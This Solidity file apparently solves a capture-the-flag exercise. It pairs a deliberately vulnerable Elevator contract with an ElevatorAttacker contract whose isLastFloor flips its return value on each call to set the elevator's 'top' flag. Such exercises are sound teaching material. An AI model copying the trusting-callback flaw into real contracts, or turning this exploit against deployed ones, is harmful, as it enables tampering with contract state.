// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (!building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract ElevatorAttacker is Building {
  bool toggleMe = true;

  function isLastFloor(uint) external override returns (bool) {
    toggleMe = !toggleMe;
    return toggleMe;
  }

  function callElevator(address _elevator) public {
    Elevator(_elevator).goTo(1);
  }
}
